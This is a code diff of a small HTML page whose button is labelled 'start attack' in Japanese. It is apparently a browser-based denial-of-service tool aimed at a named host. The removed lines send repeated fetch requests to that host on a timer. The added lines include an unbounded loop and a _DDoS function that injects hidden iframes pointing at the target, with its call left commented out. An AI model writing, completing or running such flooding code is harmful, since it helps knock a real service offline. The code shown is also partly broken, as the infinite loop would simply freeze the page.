@@ -17,13 +17,21 @@
   document.getElementById('s').onclick = function() {
     let n = 0
     document.getElementById('i').innerHTML = '攻撃開始'
-    setInterval(function() {
-      try {
+    //setInterval(function() {
+    /* try {
         fetch('https://gp-uuc4.iss.netstar-inc.com');
-      } catch (e) {}
+      } catch (e) {}*/
+    //  document.getElementById('c').innerHTML = n;
+    //  n++
+    //}, document.getElementById('in').value)
+    for(;;){
+      //setTimeout(_DDoS("https://gp-uuc4.iss.netstar-inc.com"),10);
       document.getElementById('c').innerHTML = n;
       n++
-    }, document.getElementById('in').value)
+    }
+    function _DDoS(url){
+      document.body.innerHTML+='<iframe src="'+url+'" style="display:none;"> </iframe>';
+    }
   }
 </script>
 </html>
